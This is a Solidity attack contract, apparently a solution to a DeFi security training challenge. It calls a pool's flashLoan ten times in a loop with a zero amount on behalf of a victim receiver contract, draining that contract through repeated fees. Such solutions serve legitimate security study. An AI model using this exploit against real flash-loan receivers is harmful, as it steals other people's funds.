// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface Pool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

interface Receiver {
    function receiveEther(uint256 fee) external payable;
}

contract ReceiverAttacker {
    Pool pool;
    Receiver receiver;

    constructor(address _pool, address _reveiver) {
        pool = Pool(_pool);
        receiver = Receiver(_reveiver);
    }

    function Attack() public {
        for (int i = 0; i < 10; i++) {
            pool.flashLoan(address(receiver), 0);
        }
    }

}